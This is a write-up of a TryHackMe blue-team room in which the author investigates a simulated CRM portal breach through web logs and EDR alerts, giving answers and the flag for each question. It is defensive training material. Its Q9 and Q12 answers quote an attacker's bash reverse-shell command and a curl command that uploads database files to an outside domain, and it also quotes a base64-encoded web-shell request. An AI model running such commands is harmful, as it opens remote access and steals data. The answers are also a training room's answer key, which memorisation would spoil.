# TryHackMe — Portal Drop

| | |
|---|---|
| **URL** | https://tryhackme.com/room/portaldrop |
| **Category** | SOC / Blue Team (web log analysis, EDR investigation) |
| **Difficulty** | Easy |
| **Estimated Time** | 45 minutes |
| **Completions** | 1,078 |
| **Date Completed** | 2026-11-14 |

## Overview
Investigate a suspected breach on a CRM portal using logs and EDR data. A WAF alert reports a web scan on crm.trypatchme.thm followed by a suspicious file upload anomaly. The web access logs and the EDR console must be correlated to decide whether it is a false positive or whether the portal has been breached.

---

## Task 1 — Portal Drop

---

**Q1:** What is the IP address that initiated the brute force on the CRM web portal?

**Approach:**
To find the IP address that initiated the brute force on the host we can sort by finding all the login.php endpoints in the logs sense there is where the brute force will be taking place.
After sorting for the login.php endpoint we see that some events with the login.php is crammed up with is a strong indicator for a brute force. Here we also find the IP address that is making the brute force attack. 
**Answer:**
34[.]67[.]91[.]83

---

**Q2:** How many successful and failed logins are seen in the web logs? (Format: 42, 56)

**Approach:**
A Failed login gives the user a 401 code when the login attempt fail and receives a 200 code when a login succeed. With this in mind we can filter like this ´´´"POST /CRM/login.php HTTP/1.1" 200´´´
and ´´´"POST /CRM/login.php HTTP/1.1" 401´´´ this gives us all the matches for the failed and succeeded logins.

**Answer:**
18, 35

---

**Q3:** Following the brute force, which user-agent was used for the file upload?

**Approach:**
Sorting by the attackers IP address and upload.php endpoint we find the logs where the attacker interacted with the upload endpoint and the user agent that was used to do so.

**Answer:**
python-requests/2.31.0

---

**Q4:** What was the name of the suspicious file uploaded by the attacker?

**Approach:**
right under we see that the name of the uploaded file is "invoice.php"

**Answer:**
invoice.php

---

**Q5:** At what time did the attacker first invoke the uploaded file? (Format: 2025-10-24 15:35:50)

**Approach:**
Looking at the time stamp on the same log we find when this file was uploaded.

**Answer:**
2025-11-06 14:27:34 

---

**Q6:** What is the first decoded command the attacker ran on the CRM?

**Approach:**
The file invoice.php is used to execute command on the system. "/invoice.php?q=ZDJodllXMXA&auth=31337" the "ZDJodllXMXA" looks like base64 and when we decode it using cyberchef we get our answer

**Answer:**
whoami

---

**Q7:** Summarize the actions of the file and the way it was uploaded. Which MITRE Persistence sub-technique ID is most applicable to it?

**Approach:**
So the attacker has brute forced in to a website through a login page and then navigated to a upload section where the attacker could upload files. 
It's in this upload section where the attacker also executes commands through the website when uploading files. To this there's a fitting sub-technique.

**Answer:**
T1505.003

---

**Q8:** Which process image executes attacker commands received from the web?

**Approach:**
For this task we need to look in the provided EDR console. In here we can see that we have received 4 alerts. There are 2 high alerts and one of them is called "Parent-Child Anomaly: Shell Spawn" 
which fits our investigation of this file upload good. Inspecting this alert shows us what process image that executed the attackers command.

**Answer:**
/usr/sbin/php-fpm7.4

---

**Q9:** What command allowed the attacker to open a bash reverse shell?

**Approach:**
The second command that was executed with a file upload is a bit further down in the logs but is also shown in the IOCs in the EDR console

**Answer:**
bash -i >& /dev/tcp/115[.]58[.]148[.]86/8080 0>&1

---

**Q10:** Which Linux user executes the entered malicious commands?

**Approach:**
In the summary of the alert in thee EDR console we see the user related with the command.

**Answer:**
www-data

---

**Q11:** What sensitive CRM configuration file did the attacker access?

**Approach:**
In the "Unusual User Behavior: System Discovery" alert in the Process info tab we get options on different commands executed by the attacker related to this alert.
If we press the command "cat" we get a window showing us what file was read by the attacker. 

**Answer:**
/etc/trycrm/config.json

---

**Q12:** Which domain was used to exfiltrate the CRM portal database?

**Approach:**
 In the same alert we can inspect the curl command that was used "curl -sS -T /var/lib/trycrm/prod.db -T /var/lib/trycrm/prod.idx https[://]portaldrop2025[.]xyz/x7Ja0mlqP" 

**Answer:**
portaldrop2025[.]xyz

---

**Q13:** After responding to all detections, what flag do you obtain?

**Approach:**
Completing all the 4 alerts give the flag!

**Answer:**
THM{p0rtal_dropp3d?}

---

## Indicators of Compromise (IOCs)

| Type | Value | Description |
|------|-------|-------------|
| IP | 34[.]67[.]91[.]83 | Brute force source |
| Domain | portaldrop2025[.]xyz | Database exfiltration |
| Hash |  |  |
| File | invoice.php | Uploaded file |

## Key Takeaways
-
